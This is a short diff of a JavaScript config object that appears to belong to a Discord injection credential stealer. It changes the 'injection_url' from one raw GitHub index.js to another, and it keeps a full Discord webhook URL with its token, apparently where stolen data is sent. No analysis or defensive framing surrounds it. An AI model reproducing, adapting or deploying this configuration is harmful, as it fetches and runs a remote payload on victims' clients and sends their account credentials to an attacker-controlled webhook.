@@ -23,7 +23,7 @@ var config = {
   creator: "moi",
   transfer_link: `%TRANSFER_URL%`,
   injection_url:
-    "https://raw.githubusercontent.com/hawkish-teams/cerf/main/index.js",
+    "https://raw.githubusercontent.com/Hoangdepzaivcl/wtf/main/index.js",
   webhook: "https://discord.com/api/webhooks/1165971453674541137/sjQEXxvbc3PUvFQjz35ZHI_kYd-ojnJTp-0Rhh5BdB3tTxCCTOtPfMJzBAaau3C5W6Ur",
   Placed: "%API_URL%",
   Filter: {
